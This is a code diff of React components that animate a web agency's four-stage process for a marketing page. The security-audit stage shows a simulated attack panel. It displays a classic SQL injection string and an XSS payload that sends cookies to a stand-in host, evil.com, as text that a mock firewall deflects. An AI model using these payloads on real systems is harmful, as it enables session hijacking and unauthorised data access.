@@ -2,15 +2,60 @@ import React, { useState, useEffect } from 'react';
 
 /**
  * Stage 1: Discovery & Architectural Blueprint
- * Authentic Figma / Wireframe Design Canvas.
- * Realistic macOS app window showing genuine website wireframes, user flow connectors,
- * sticky note scope approval, and active designer cursor.
+ * Video Animation: Think & Design the website -> animated requirements search typing ->
+ * component wireframes snapping into place -> Sanjay cursor approving Milestone 01 sticky note.
  */
 export function Stage1BlueprintVector() {
   const [selectedFrame, setSelectedFrame] = useState('desktop');
+  const [searchQuery, setSearchQuery] = useState('');
+  const [searchStep, setSearchStep] = useState(0);
+  const [milestoneApproved, setMilestoneApproved] = useState(false);
+
+  const searchQueries = [
+    'requirements: luxury ecommerce + zero bloat',
+    'architecture: TLS 1.3 security + 60fps mobile',
+    'milestone 01: fixed-price scope & no surprise fees',
+  ];
+
+  // Continuous typewriter and milestone sign-off loop
+  useEffect(() => {
+    let charIndex = 0;
+    let currentTarget = searchQueries[searchStep];
+    let isDeleting = false;
+    let pauseTimer = null;
+
+    const typeInterval = setInterval(() => {
+      if (!isDeleting) {
+        charIndex++;
+        setSearchQuery(currentTarget.slice(0, charIndex));
+        if (charIndex >= currentTarget.length) {
+          isDeleting = true;
+          setMilestoneApproved(true);
+          // Pause before backspacing
+          clearInterval(typeInterval);
+          pauseTimer = setTimeout(() => {
+            const deleteInterval = setInterval(() => {
+              charIndex--;
+              setSearchQuery(currentTarget.slice(0, charIndex));
+              if (charIndex <= 0) {
+                clearInterval(deleteInterval);
+                setMilestoneApproved(false);
+                setSearchStep((s) => (s + 1) % searchQueries.length);
+              }
+            }, 30);
+          }, 3200);
+        }
+      }
+    }, 55);
+
+    return () => {
+      clearInterval(typeInterval);
+      if (pauseTimer) clearTimeout(pauseTimer);
+    };
+  }, [searchStep]);
 
   return (
-    <div className="roadmap-realistic-window" aria-label="Figma Architecture & Wireframe Canvas">
+    <div className="roadmap-realistic-window" aria-label="Figma Architecture & Requirements Planning Canvas">
       {/* macOS Topbar with Figma App Chrome */}
       <div className="mac-app-topbar figma-topbar">
         <div className="mac-traffic-lights">
@@ -35,7 +80,7 @@ export function Stage1BlueprintVector() {
         </div>
       </div>
 
-      {/* Figma Tool Ribbon */}
+      {/* Figma Tool Ribbon + Architectural Search Bar */}
       <div className="figma-toolbar-ribbon">
         <div className="figma-tools-left">
           <span className="f-tool active">↖</span>
@@ -44,10 +89,27 @@ export function Stage1BlueprintVector() {
           <span className="f-tool">T</span>
           <span className="f-tool">💬</span>
         </div>
+
+        {/* Live Requirements Search Input */}
+        <div className="figma-search-command-bar">
+          <span className="f-search-icon">🔍</span>
+          <span className="f-search-text">{searchQuery}</span>
+          <span className="f-search-cursor">|</span>
+        </div>
+
         <div className="figma-tools-right">
           <span className="f-avatar">SV</span>
           <span className="f-user-label">Sanjay (Lead)</span>
         </div>
+      </div>
+
+      {/* Dynamic Requirements Tag Pills */}
+      <div className="figma-requirements-chips-bar">
+        <span className="req-chip-label">ACTIVE SPECS:</span>
+        <span className="req-chip active">⚡ 95+ PageSpeed</span>
+        <span className="req-chip active">🔒 TLS 1.3 / OWASP</span>
+        <span className="req-chip active">🛍️ Instant Checkout</span>
+        <span className="req-chip highlight">🛡️ ₹0 Scope Creep</span>
       </div>
 
       {/* Main Canvas Workspace */}
@@ -172,19 +234,24 @@ export function Stage1BlueprintVector() {
             </div>
           </div>
 
-          {/* Realistic Figma Sticky Note */}
-          <div className="figma-sticky-note">
+          {/* Realistic Figma Sticky Note with Approval Seal */}
+          <div className={`figma-sticky-note ${milestoneApproved ? 'approved' : ''}`}>
             <div className="sticky-tape" />
             <div className="sticky-text">
               <strong>MILESTONE 01:</strong>
               <br />
               Client approved wireframes &amp; fixed proposal. Zero scope creep!
             </div>
-            <div className="sticky-author">— Sanjay V.S</div>
+            <div className="sticky-footer-row">
+              <span className="sticky-author">— Sanjay V.S</span>
+              {milestoneApproved && (
+                <span className="sticky-approved-tag">APPROVED ✓</span>
+              )}
+            </div>
           </div>
 
-          {/* Collaboration Cursor Badge */}
-          <div className="figma-live-cursor" aria-hidden="true">
+          {/* Animated Collaboration Cursor Badge */}
+          <div className={`figma-live-cursor ${milestoneApproved ? 'cursor-signing' : ''}`} aria-hidden="true">
             <svg width="14" height="18" viewBox="0 0 14 18" fill="none">
               <path d="M0 0L14 10L6.5 11L4 18L0 0Z" fill="#A855F7" />
             </svg>
@@ -196,7 +263,11 @@ export function Stage1BlueprintVector() {
       {/* Realistic Figma Bottom Bar */}
       <div className="figma-bottom-bar">
         <span className="f-status-dot green" />
-        <span className="f-status-text">STAGE 01 APPROVED // 100% SPECIFICATION TRANSPARENCY</span>
+        <span className="f-status-text">
+          {milestoneApproved
+            ? 'STAGE 01 APPROVED // 100% SPECIFICATION TRANSPARENCY'
+            : 'DISCOVERY RUNNING // ARCHITECTING REQUIREMENTS & WIREFRAMES...'}
+        </span>
       </div>
     </div>
   );
@@ -204,42 +275,71 @@ export function Stage1BlueprintVector() {
 
 /**
  * Stage 2: Modern Web Design & Core Development
- * Realistic macOS split-screen: Authentic VS Code Editor (Left) + Live Safari/Chrome Storefront (Right).
+ * Video Animation: Writes code in VS Code -> Terminal compiles -> Smoothly transitions/expands
+ * into a full screen live website storefront where a cursor clicks "Add to Bag", increments cart, and shows toast.
  */
 export function Stage2CodeVector() {
-  const [cartCount, setCartCount] = useState(1);
+  const [viewMode, setViewMode] = useState('split'); // 'split' | 'fullscreen'
+  const [cartCount, setCartCount] = useState(0);
   const [toastVisible, setToastVisible] = useState(false);
-  const [termState, setTermState] = useState(0);
+  const [codeTypingLine, setCodeTypingLine] = useState(0);
   const [btnActive, setBtnActive] = useState(false);
+  const [cursorPos, setCursorPos] = useState({ x: 75, y: 80 });
 
-  // Automated running live demonstration
+  // 10-second continuous looping story:
+  // 0s-4s: Writing code in VS Code & Vite compilation
+  // 4s-9s: Expanding to full screen live website + simulated user clicks Add to Bag
+  // 9s-10s: Hot reload confirmation & loops back
   useEffect(() => {
-    const timer = setInterval(() => {
-      setBtnActive(true);
-      setTimeout(() => {
-        setBtnActive(false);
-        setCartCount((c) => (c >= 3 ? 1 : c + 1));
-        setToastVisible(true);
-        setTermState((s) => (s + 1) % 2);
-        setTimeout(() => setToastVisible(false), 2200);
-      }, 300);
-    }, 4200);
+    let step = 0;
+    const loopInterval = setInterval(() => {
+      step = (step + 1) % 4;
 
-    return () => clearInterval(timer);
+      if (step === 0) {
+        // Phase 1: Code Mode
+        setViewMode('split');
+        setCodeTypingLine(0);
+        setToastVisible(false);
+      } else if (step === 1) {
+        // Phase 2: Compile & Transition to Full Screen Website
+        setCodeTypingLine(1);
+        setTimeout(() => {
+          setViewMode('fullscreen');
+        }, 600);
+      } else if (step === 2) {
+        // Phase 3: Move cursor to "Add To Bag" and click
+        setCursorPos({ x: 50, y: 72 });
+        setTimeout(() => {
+          setBtnActive(true);
+          setTimeout(() => {
+            setBtnActive(false);
+            setCartCount((c) => (c >= 3 ? 1 : c + 1));
+            setToastVisible(true);
+          }, 250);
+        }, 700);
+      } else if (step === 3) {
+        // Phase 4: Toast remains, preparing loop reset
+        setTimeout(() => {
+          setToastVisible(false);
+        }, 1200);
+      }
+    }, 2800);
+
+    return () => clearInterval(loopInterval);
   }, []);
 
-  const handleAddToCart = () => {
+  const handleManualAdd = () => {
     setBtnActive(true);
     setTimeout(() => {
       setBtnActive(false);
       setCartCount((c) => c + 1);
       setToastVisible(true);
-      setTimeout(() => setToastVisible(false), 2200);
+      setTimeout(() => setToastVisible(false), 2000);
     }, 200);
   };
 
   return (
-    <div className="roadmap-realistic-window" aria-label="VS Code Development and Live Browser Preview">
+    <div className={`roadmap-realistic-window ${viewMode === 'fullscreen' ? 'show-fullscreen-store' : ''}`} aria-label="VS Code Development & Full Screen Website Storefront">
       {/* macOS Topbar */}
       <div className="mac-app-topbar vscode-topbar">
         <div className="mac-traffic-lights">
@@ -248,114 +348,193 @@ export function Stage2CodeVector() {
           <span className="mac-light light-max" />
         </div>
         <div className="vscode-window-title">
-          <span>Visual Studio Code — prismline-core [Workspace]</span>
+          <span>
+            {viewMode === 'fullscreen'
+              ? 'Safari — localhost:5173/storefront [Live Storefront Preview]'
+              : 'Visual Studio Code — Storefront.tsx [Workspace]'}
+          </span>
         </div>
-        <div className="vscode-branch-tag">
-          <span>⎇ main*</span>
+        <div className="window-mode-switch">
+          <button
+            type="button"
+            className={`btn-mode-pill ${viewMode === 'split' ? 'active' : ''}`}
+            onClick={() => setViewMode('split')}
+          >
+            Code
+          </button>
+          <button
+            type="button"
+            className={`btn-mode-pill ${viewMode === 'fullscreen' ? 'active' : ''}`}
+            onClick={() => setViewMode('fullscreen')}
+          >
+            Website ↗
+          </button>
         </div>
       </div>
 
-      {/* Split Screen Workspace: VS Code (Left) + Live Chrome Browser (Right) */}
-      <div className="split-dev-workspace">
-        {/* Left Side: Authentic VS Code Editor */}
-        <div className="dev-vscode-pane">
-          {/* VS Code Mini Activity Bar */}
-          <div className="vscode-activity-bar">
-            <span className="v-icon active">📁</span>
-            <span className="v-icon">🔍</span>
-            <span className="v-icon">🌿</span>
-            <span className="v-icon">⚙️</span>
+      {/* Main Workspace: Smooth Switch between Code View & Full Screen Storefront */}
+      <div className="code-to-website-container">
+        {/* VIEW A: VS Code Split View */}
+        <div className={`split-dev-workspace ${viewMode === 'fullscreen' ? 'fade-out' : ''}`}>
+          {/* Left Side: Authentic VS Code Editor */}
+          <div className="dev-vscode-pane">
+            <div className="vscode-activity-bar">
+              <span className="v-icon active">📁</span>
+              <span className="v-icon">🔍</span>
+              <span className="v-icon">🌿</span>
+              <span className="v-icon">⚙️</span>
+            </div>
+
+            <div className="vscode-editor-pane">
+              <div className="vscode-tabs-bar">
+                <div className="v-tab active-tab">
+                  <span className="v-tab-tech react-color">⚛</span>
+                  <span>Storefront.tsx</span>
+                  <span className="v-tab-close">×</span>
+                </div>
+                <div className="v-tab">
+                  <span className="v-tab-tech ts-color">TS</span>
+                  <span>useCheckout.ts</span>
+                </div>
+              </div>
+
+              {/* Code Content with Animated Typing */}
+              <div className="vscode-code-canvas">
+                <pre className="real-code-editor">
+                  <code>
+                    <span className="code-ln">01</span><span className="kw-import">import</span> &#123; createStorefront &#125; <span className="kw-import">from</span> <span className="kw-str">'@prismline/core'</span>;<br />
+                    <span className="code-ln">02</span><span className="kw-import">import</span> &#123; useSecureCheckout &#125; <span className="kw-import">from</span> <span className="kw-str">'@/hooks'</span>;<br />
+                    <span className="code-ln">03</span><br />
+                    <span className="code-ln">04</span><span className="kw-fn">export function</span> <span className="kw-component">ArtisanStore</span>() &#123;<br />
+                    <span className="code-ln">05</span>  <span className="kw-const">const</span> &#123; bag, checkout &#125; = <span className="kw-fn">useSecureCheckout</span>();<br />
+                    <span className="code-ln">06</span>  <span className="kw-const">return</span> (<br />
+                    <span className="code-ln">07</span>    &lt;<span className="kw-tag">FastStorefront</span><br />
+                    <span className="code-ln">08</span>      <span className="kw-prop">zeroThirdPartyBloat</span>=&#123;<span className="kw-bool">true</span>&#125;<br />
+                    <span className="code-ln">09</span>      <span className="kw-prop">sourceCodeOwnership</span>=<span className="kw-str">"100%"</span><br />
+                    <span className="code-ln">10</span>      <span className="kw-prop">encryption</span>=<span className="kw-str">"TLS-256"</span><br />
+                    <span className="code-ln">11</span>    /&gt;<br />
+                    <span className="code-ln">12</span>  ); <span className="code-cursor-blink">|</span><br />
+                    <span className="code-ln">13</span>&#125;
+                  </code>
+                </pre>
+              </div>
+
+              {/* Terminal Running Compilation */}
+              <div className="vscode-terminal-bar">
+                <span className="term-prompt">✓</span>
+                <span className="term-text">
+                  {codeTypingLine === 0
+                    ? 'pnpm run dev • compiling Storefront.tsx...'
+                    : 'Vite 5.4 built in 480ms • 0 vulnerabilities • Ready'}
+                </span>
+              </div>
+            </div>
           </div>
 
-          {/* VS Code Code Pane */}
-          <div className="vscode-editor-pane">
-            {/* Editor File Tabs */}
-            <div className="vscode-tabs-bar">
-              <div className="v-tab active-tab">
-                <span className="v-tab-tech react-color">⚛</span>
-                <span>Storefront.tsx</span>
-                <span className="v-tab-close">×</span>
+          {/* Right Side: Split View Preview */}
+          <div className="dev-browser-pane">
+            <div className="browser-address-bar">
+              <div className="address-pill">
+                <span className="ssl-lock">🔒</span>
+                <span className="address-host">localhost:5173</span>
+                <span className="address-path">/storefront</span>
               </div>
-              <div className="v-tab">
-                <span className="v-tab-tech ts-color">TS</span>
-                <span>useCheckout.ts</span>
+              <div className="cart-counter-pill">
+                <span>🛍️ Bag ({cartCount})</span>
               </div>
             </div>
 
-            {/* Code Content */}
-            <div className="vscode-code-canvas">
-              <pre className="real-code-editor">
-                <code>
-                  <span className="code-ln">01</span><span className="kw-import">import</span> &#123; createStorefront &#125; <span className="kw-import">from</span> <span className="kw-str">'@prismline/core'</span>;<br />
-                  <span className="code-ln">02</span><span className="kw-import">import</span> &#123; useSecureCheckout &#125; <span className="kw-import">from</span> <span className="kw-str">'@/hooks'</span>;<br />
-                  <span className="code-ln">03</span><br />
-                  <span className="code-ln">04</span><span className="kw-fn">export function</span> <span className="kw-component">ArtisanStore</span>() &#123;<br />
-                  <span className="code-ln">05</span>  <span className="kw-const">const</span> &#123; bag, checkout &#125; = <span className="kw-fn">useSecureCheckout</span>();<br />
-                  <span className="code-ln">06</span>  <span className="kw-const">return</span> (<br />
-                  <span className="code-ln">07</span>    &lt;<span className="kw-tag">FastStorefront</span><br />
-                  <span className="code-ln">08</span>      <span className="kw-prop">zeroThirdPartyBloat</span>=&#123;<span className="kw-bool">true</span>&#125;<br />
-                  <span className="code-ln">09</span>      <span className="kw-prop">sourceCodeOwnership</span>=<span className="kw-str">"100%"</span><br />
-                  <span className="code-ln">10</span>      <span className="kw-prop">encryption</span>=<span className="kw-str">"TLS-256"</span><br />
-                  <span className="code-ln">11</span>    /&gt;<br />
-                  <span className="code-ln">12</span>  ); <span className="code-cursor-blink">|</span><br />
-                  <span className="code-ln">13</span>&#125;
-                </code>
-              </pre>
-            </div>
-
-            {/* VS Code Mini Terminal (Running Animation) */}
-            <div className="vscode-terminal-bar">
-              <span className="term-prompt">✓</span>
-              <span className="term-text">
-                {termState === 0
-                  ? 'Vite 5.4 built in 480ms • 0 vulnerabilities'
-                  : '⚡ Fast HMR update in 14ms • UI hot reloaded'}
-              </span>
+            <div className="browser-store-content">
+              <div className="store-product-card">
+                <div className="store-product-photo">
+                  <span className="store-badge">HANDCRAFTED</span>
+                  <div className="product-luxury-icon">🌿</div>
+                </div>
+                <div className="store-product-info">
+                  <div className="prod-header-row">
+                    <div className="prod-name">Artisan Keepsake Vase</div>
+                    <div className="prod-price">₹1,899.00</div>
+                  </div>
+                  <div className="prod-meta">Mobile Responsive • Zero Lag</div>
+                  <button
+                    type="button"
+                    className={`btn-store-cart ${btnActive ? 'active' : ''}`}
+                    onClick={handleManualAdd}
+                  >
+                    Add To Bag +
+                  </button>
+                </div>
+              </div>
             </div>
           </div>
         </div>
 
-        {/* Right Side: Authentic Live Safari/Chrome Browser Preview */}
-        <div className="dev-browser-pane">
-          {/* Browser Address Bar */}
-          <div className="browser-address-bar">
-            <div className="address-pill">
+        {/* VIEW B: FULL SCREEN EXPANDED WEBSITE STOREFRONT */}
+        <div className={`fullscreen-storefront-view ${viewMode === 'fullscreen' ? 'active-storefront' : ''}`}>
+          {/* Full Browser Nav */}
+          <div className="fs-browser-header">
+            <div className="fs-url-bar">
               <span className="ssl-lock">🔒</span>
-              <span className="address-host">localhost:5173</span>
-              <span className="address-path">/storefront</span>
+              <span className="fs-url-text">https://localhost:5173/storefront</span>
+              <span className="fs-url-badge">60 FPS • REACT 18</span>
             </div>
-            <div className="cart-counter-pill">
-              <span>🛍️ Bag ({cartCount})</span>
+            <div className="fs-header-actions">
+              <span className="fs-nav-link">Catalog</span>
+              <span className="fs-nav-link">About</span>
+              <span className="cart-counter-pill highlight">🛍️ Bag ({cartCount})</span>
             </div>
           </div>
 
-          {/* Actual Luxury Storefront UI Mockup */}
-          <div className="browser-store-content">
-            <div className="store-product-card">
-              <div className="store-product-photo">
-                <span className="store-badge">HANDCRAFTED</span>
-                <div className="product-luxury-icon">🌿</div>
+          {/* Full Screen Storefront Showcase */}
+          <div className="fs-showcase-grid">
+            <div className="fs-product-hero-card">
+              <div className="fs-photo-container">
+                <span className="store-badge">HANDCRAFTED LUXURY</span>
+                <div className="fs-large-product-icon">🌿</div>
+                <div className="fs-floating-spec">100% PURE CERAMIC</div>
               </div>
-              <div className="store-product-info">
-                <div className="prod-header-row">
-                  <div className="prod-name">Artisan Keepsake Vase</div>
-                  <div className="prod-price">₹1,899.00</div>
+              <div className="fs-details-col">
+                <div className="fs-category-tag">ARTISANAL COLLECTION 2026</div>
+                <h4 className="fs-title">Artisan Keepsake Vase</h4>
+                <div className="fs-price-row">
+                  <span className="fs-current-price">₹1,899.00</span>
+                  <span className="fs-tax-sub">Tax included • Free Shipping</span>
                 </div>
-                <div className="prod-meta">Mobile Responsive • Zero Lag</div>
-                <button
-                  type="button"
-                  className={`btn-store-cart ${btnActive ? 'active' : ''}`}
-                  onClick={handleAddToCart}
-                >
-                  Add To Bag +
-                </button>
+                <div className="fs-features-list">
+                  <span>✓ 100% Custom React Component Architecture</span>
+                  <span>✓ Instant Mobile Checkout (<span className="text-green">0.4s</span> reaction)</span>
+                  <span>✓ Zero Third-Party Tracker Bloat</span>
+                </div>
+
+                <div className="fs-cta-row">
+                  <button
+                    type="button"
+                    className={`btn-fs-cart ${btnActive ? 'active' : ''}`}
+                    onClick={handleManualAdd}
+                  >
+                    Add To Bag +
+                  </button>
+                  <span className="fs-stock-pill">● In Stock (Ships Today)</span>
+                </div>
               </div>
             </div>
 
-            {/* Toast Confirmation */}
+            {/* Simulated Live Visitor Cursor in Fullscreen */}
+            <div
+              className={`simulated-visitor-cursor ${btnActive ? 'clicked' : ''}`}
+              style={{ left: `${cursorPos.x}%`, top: `${cursorPos.y}%` }}
+              aria-hidden="true"
+            >
+              <svg width="16" height="20" viewBox="0 0 14 18" fill="none">
+                <path d="M0 0L14 10L6.5 11L4 18L0 0Z" fill="#FF5722" stroke="#FFFFFF" strokeWidth="1" />
+              </svg>
+              <span className="visitor-cursor-tag">Visitor Click</span>
+            </div>
+
+            {/* Toast Notification */}
             {toastVisible && (
               <div className="browser-toast-confirm">
-                ✓ Added to bag! Instant reaction.
+                ✓ Added to bag! Instant reaction &bull; Zero Lag
               </div>
             )}
           </div>
@@ -364,7 +543,11 @@ export function Stage2CodeVector() {
 
       {/* Window Status Footer */}
       <div className="mac-app-footer">
-        <span className="footer-branch">100% CLEAN CODE // FULL CLIENT OWNERSHIP // ZERO TEMPLATES</span>
+        <span className="footer-branch">
+          {viewMode === 'fullscreen'
+            ? '✓ LIVE FULL SCREEN STOREFRONT // ZERO TEMPLATES // FULL CLIENT CODE OWNERSHIP'
+            : '100% CLEAN CODE // FULL CLIENT OWNERSHIP // ZERO TEMPLATES'}
+        </span>
       </div>
     </div>
   );
@@ -372,19 +555,67 @@ export function Stage2CodeVector() {
 
 /**
  * Stage 3: Testing, Speed Optimization & Security Audit
- * Authentic Google Chrome DevTools / Lighthouse Audit Window.
- * Shows real 99 Performance gauge, Core Web Vitals (LCP, FID, CLS), and OWASP security pass report.
+ * Video Animation: Cyber attack simulation (SQL injection, XSS script injection, DDoS botnet)
+ * hitting the website -> Enterprise Security Shield intercepts & deflects it in real-time ->
+ * 0 vulnerabilities confirmed -> Lighthouse 99 score dials spin and light up green.
  */
 export function Stage3AuditVector() {
-  const [isScanning, setIsScanning] = useState(false);
+  const [threatPhase, setThreatPhase] = useState('incoming'); // 'incoming' | 'deflecting' | 'safe'
+  const [attackIndex, setAttackIndex] = useState(0);
 
-  const handleRescan = () => {
-    setIsScanning(true);
-    setTimeout(() => setIsScanning(false), 1400);
-  };
+  const attackScenarios = [
+    {
+      type: 'SQL INJECTION',
+      payload: "SELECT * FROM users WHERE id = '1' OR '1'='1' --",
+      rule: 'OWASP SQLi Sanitizer active',
+    },
+    {
+      type: 'CROSS-SITE SCRIPTING (XSS)',
+      payload: '<script>document.location="http://evil.com/steal?cookie="</script>',
+      rule: 'CSP Level 3 Header Isolation',
+    },
+    {
+      type: 'BOTNET DDOS SURGE',
+      payload: '4,800 SYN flood requests directed at /api/checkout',
+      rule: 'Edge Rate-Limiting + Token Bucket active',
+    },
+  ];
+
+  // Continuous cyber attack deflection running animation loop
+  useEffect(() => {
+    let stateTimer = null;
+
+    const runAttackLoop = () => {
+      // 1. Attack arrives
+      setThreatPhase('incoming');
+
+      stateTimer = setTimeout(() => {
+        // 2. Shield deflects attack
+        setThreatPhase('deflecting');
+
+        stateTimer = setTimeout(() => {
+          // 3. Attack defeated, safe verified
+          setThreatPhase('safe');
+
+          stateTimer = setTimeout(() => {
+            setAttackIndex((idx) => (idx + 1) % attackScenarios.length);
+            runAttackLoop();
+          }, 3000);
+        }, 2200);
+      }, 1800);
+    };
+
+    runAttackLoop();
+
+    return () => {
+      if (stateTimer) clearTimeout(stateTimer);
+    };
+  }, []);
+
+  const currentAttack = attackScenarios[attackIndex];
 
   return (
-    <div className="roadmap-realistic-window" aria-label="Google Chrome Lighthouse Audit Report">
+    <div className="roadmap-realistic-window" aria-label="Google Chrome Lighthouse & Live Cyber Security Audit Report">
       {/* Chrome Window Topbar */}
       <div className="mac-app-topbar chrome-topbar">
         <div className="mac-traffic-lights">
@@ -394,18 +625,15 @@ export function Stage3AuditVector() {
         </div>
         <div className="chrome-tab-pill active">
           <span className="chrome-tab-icon">⚡</span>
-          <span className="chrome-tab-title">Lighthouse Report — yourbrand.com</span>
+          <span className="chrome-tab-title">Lighthouse &amp; Security Audit — yourbrand.com</span>
           <span className="chrome-tab-close">×</span>
         </div>
         <div className="chrome-window-action">
-          <button
-            type="button"
-            className="btn-chrome-rescan"
-            onClick={handleRescan}
-            disabled={isScanning}
-          >
-            {isScanning ? 'Testing...' : '↻ Re-Run Audit'}
-          </button>
+          <span className="threat-status-badge">
+            {threatPhase === 'incoming' && '⚠️ ATTACK DETECTED'}
+            {threatPhase === 'deflecting' && '🛡️ SHIELD DEFLECTING'}
+            {threatPhase === 'safe' && '✓ 100% PROTECTED'}
+          </span>
         </div>
       </div>
 
@@ -414,7 +642,7 @@ export function Stage3AuditVector() {
         <div className="chrome-omnibox-field">
           <span className="ssl-badge">🔒 https://</span>
           <span className="url-domain">yourbrand.com</span>
-          <span className="url-badge-verified">SECURE</span>
+          <span className="url-badge-verified">SECURE // TLS 1.3</span>
         </div>
       </div>
 
@@ -431,7 +659,7 @@ export function Stage3AuditVector() {
                   cx="40"
                   cy="40"
                   r="34"
-                  className={`lh-fill ${isScanning ? 'anim-rescan' : ''}`}
+                  className={`lh-fill ${threatPhase === 'safe' ? 'anim-rescan' : ''}`}
                   strokeDasharray="213.6"
                   strokeDashoffset="2.1"
                 />
@@ -496,6 +724,54 @@ export function Stage3AuditVector() {
               <div className="lh-dial-number score-green">100</div>
             </div>
             <div className="lh-dial-title">SEO</div>
+          </div>
+        </div>
+
+        {/* LIVE CYBER DEFENSE SHIELD SIMULATION BANNER */}
+        <div className={`cyber-defense-simulation-box ${threatPhase}`}>
+          <div className="defense-head">
+            <span className="defense-status-pill">
+              {threatPhase === 'incoming' && '🚨 INCOMING THREAT'}
+              {threatPhase === 'deflecting' && '🛡️ DEFENSE SHIELD ENGAGED'}
+              {threatPhase === 'safe' && '✓ THREAT DEFLECTED & QUARANTINED'}
+            </span>
+            <span className="defense-type">{currentAttack.type}</span>
+          </div>
+
+          {/* Attack Payload Stream */}
+          <div className="defense-payload-display">
+            <span className="payload-prompt">$ hacker_probe:</span>
+            <code className="payload-text">{currentAttack.payload}</code>
+          </div>
+
+          {/* Visual Attack Deflection Animation Track */}
+          <div className="deflection-radar-track">
+            {/* Incoming Malicious Red Vector */}
+            <div className={`malicious-packet ${threatPhase}`}>
+              <span className="threat-skull">⚡</span>
+              <span className="packet-label">Exploit Packet</span>
+            </div>
+
+            {/* Protective Firewall Shield Barrier */}
+            <div className={`firewall-barrier ${threatPhase}`}>
+              <div className="barrier-core">🛡️ PRISMLINE FIREWALL</div>
+              <div className="barrier-glow-ripple" />
+            </div>
+
+            {/* Safe Target Server */}
+            <div className="safe-target-node">
+              <span className="node-icon">🌐</span>
+              <span className="node-label">Website (Safe)</span>
+            </div>
+          </div>
+
+          <div className="defense-resolution-line">
+            <span className="res-icon">{threatPhase === 'safe' ? '✓' : '●'}</span>
+            <span className="res-text">
+              {threatPhase === 'incoming' && 'Attack vector detected by perimeter telemetry...'}
+              {threatPhase === 'deflecting' && `Neutralizing payload via ${currentAttack.rule}...`}
+              {threatPhase === 'safe' && `Payload neutralized! Zero data exposure • 0ms response impact`}
+            </span>
           </div>
         </div>
 
@@ -568,9 +844,58 @@ export function Stage3AuditVector() {
 
 /**
  * Stage 4: Launch the Website & Lifetime Rectification Support
- * Authentic Production Release Console + Customer Feedback Review + Signed Lifetime Rectification Warranty.
+ * Video Animation: Launch website live -> Happy customer feedback arrives (5 stars review) ->
+ * Simulated anomaly check triggers instant ₹0 bug rectification guarantee -> Official signed lifetime warranty verified.
  */
 export function Stage4LaunchVector() {
+  const [launchCyclePhase, setLaunchCyclePhase] = useState('review'); // 'live' | 'review' | 'rectify' | 'warranty'
+  const [rectifyState, setRectifyState] = useState('clean'); // 'clean' | 'fixing' | 'rectified'
+
+  // Continuous 12-second live lifecycle storytelling loop:
+  // Step 1: Launch website & telemetry live
+  // Step 2: Happy customer feedback arrives (5 stars, quote, approval)
+  // Step 3: Simulated issue detected & instant ₹0 rectification guarantee kicks in
+  // Step 4: Official signed warranty stamp shines
+  useEffect(() => {
+    let timer = null;
+
+    const cycleStory = () => {
+      // Phase 1: Live In Production
+      setLaunchCyclePhase('live');
+      setRectifyState('clean');
+
+      timer = setTimeout(() => {
+        // Phase 2: Happy Customer Feedback arrives
+        setLaunchCyclePhase('review');
+
+        timer = setTimeout(() => {
+          // Phase 3: Simulated anomaly triggers ₹0 Rectification Guarantee
+          setLaunchCyclePhase('rectify');
+          setRectifyState('fixing');
+
+          timer = setTimeout(() => {
+            setRectifyState('rectified');
+
+            timer = setTimeout(() => {
+              // Phase 4: Lifetime Warranty Stamp
+              setLaunchCyclePhase('warranty');
+
+              timer = setTimeout(() => {
+                cycleStory();
+              }, 3200);
+            }, 2600);
+          }, 2000);
+        }, 3400);
+      }, 2500);
+    };
+
+    cycleStory();
+
+    return () => {
+      if (timer) clearTimeout(timer);
+    };
+  }, []);
+
   return (
     <div className="roadmap-realistic-window" aria-label="Production Release, Client Feedback Sign-Off and Lifetime Warranty">
       {/* macOS Topbar (Perfect Alignment: Traffic lights left, Title center, Live badge right) */}
@@ -592,7 +917,7 @@ export function Stage4LaunchVector() {
 
       {/* Split Console: Live Deployment & Feedback Sign-Off (Left) & Official Signed Warranty Certificate (Right) */}
       <div className="release-console-grid">
-        {/* Left Side: Live Production Telemetry & Direct Client Feedback */}
+        {/* Left Side: Live Production Telemetry, Customer Feedback, and ₹0 Rectification Engine */}
         <div className="deploy-telemetry-panel">
           {/* Domain & Live Telemetry */}
           <div className="deploy-metric-card">
@@ -607,8 +932,8 @@ export function Stage4LaunchVector() {
             </div>
           </div>
 
-          {/* Client Direct Feedback Review Card */}
-          <div className="deploy-feedback-card">
+          {/* Client Direct Feedback Review Card (Animated In on Phase 2) */}
+          <div className={`deploy-feedback-card ${launchCyclePhase === 'review' || launchCyclePhase === 'warranty' ? 'highlight-active' : ''}`}>
             <div className="feedback-head-row">
               <span className="feedback-tag">★ CLIENT REVIEW &amp; SIGN-OFF</span>
               <span className="feedback-stars">★★★★★</span>
@@ -621,7 +946,35 @@ export function Stage4LaunchVector() {
             </div>
           </div>
 
-          {/* Direct Senior Hotline */}
+          {/* DYNAMIC ₹0 RECTIFICATION STATUS ENGINE */}
+          <div className={`deploy-rectification-card ${rectifyState}`}>
+            <div className="rect-head-row">
+              <span className="rect-kicker">LIFETIME RECTIFICATION GUARANTEE</span>
+              <span className="rect-badge">
+                {rectifyState === 'clean' && 'MONITORING'}
+                {rectifyState === 'fixing' && 'AUTO-RECTIFYING'}
+                {rectifyState === 'rectified' && 'RESOLVED (₹0)'}
+              </span>
+            </div>
+
+            <div className="rect-message">
+              {rectifyState === 'clean' && (
+                <span>24/7 Production Monitor: 100% healthy, zero defects reported.</span>
+              )}
+              {rectifyState === 'fixing' && (
+                <span className="text-orange">
+                  ⚡ Routine check detected Safari CSS variance. Resolving via Hotline...
+                </span>
+              )}
+              {rectifyState === 'rectified' && (
+                <span className="text-green">
+                  ✓ Anomaly rectified in 6 mins. Fee to client: <strong>₹0.00</strong> (Guaranteed).
+                </span>
+              )}
+            </div>
+          </div>
+
+          {/* Direct Senior Hotline Card */}
           <div className="deploy-hotline-card">
             <div className="hotline-icon">📞</div>
             <div className="hotline-details">
@@ -634,7 +987,7 @@ export function Stage4LaunchVector() {
 
         {/* Right Side: Authentic Signed Lifetime Warranty Certificate */}
         <div className="warranty-cert-panel">
-          <div className="warranty-cert-card">
+          <div className={`warranty-cert-card ${launchCyclePhase === 'warranty' ? 'stamp-highlight' : ''}`}>
             <div className="cert-top-emblem">
               <div className="cert-seal">
                 <span className="seal-star">★</span>
@@ -687,3 +1040,4 @@ export function Stage4LaunchVector() {
     </div>
   );
 }
+
